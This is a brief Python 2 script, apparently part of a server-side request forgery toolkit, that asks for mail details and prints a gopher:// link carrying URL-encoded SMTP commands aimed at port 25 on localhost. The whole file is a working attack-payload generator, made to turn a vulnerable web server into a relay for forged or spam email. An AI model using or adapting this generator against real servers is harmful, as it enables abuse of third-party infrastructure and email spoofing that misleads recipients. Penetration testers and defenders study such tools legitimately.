import urllib

def SMTP():
    print "\033[01m"+"\nGive Details to send mail: \n"+ "\033[0m"
    mailfrom = raw_input("\033[96m" +"Mail from :  "+ "\033[0m")
    Mailto = raw_input("\033[96m" +"Mail To :  "+ "\033[0m")
    subject = raw_input("\033[96m" +"Subject :  "+ "\033[0m")
    msg = raw_input("\033[96m" +"Message :  "+ "\033[0m")

    commands = [
        'MAIL FROM:' + mailfrom,
        'RCPT To:' + Mailto,
        'DATA',
        'From:' + mailfrom,
        'Subject:' + subject,
        'Message:' + msg,
        '.'
    ]

    payload = "%0A".join(commands)
    finalpayload = urllib.quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")

    print "\033[93m" +"\nYour gopher link is ready to send Mail: \n"+ "\033[0m"
    print "\033[04m" +"gopher://127.0.0.1:25/_" + finalpayload+ "\033[0m"
    print "\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m"
